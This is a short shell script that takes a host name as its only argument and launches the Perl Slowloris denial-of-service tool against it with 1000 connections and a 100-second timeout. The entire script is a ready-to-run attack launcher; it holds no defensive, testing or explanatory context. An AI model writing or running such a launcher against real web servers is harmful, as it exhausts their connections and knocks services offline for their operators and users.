if [ $# -lt 1 ]
then
    echo "ERROR: Not enough arguments were provided!"
    exit 1
fi

# Define variables
a=$1
b=${a}
echo "$b"
perl /root/Slowlris/slowloris -dns $b -num 1000 -timeout 100
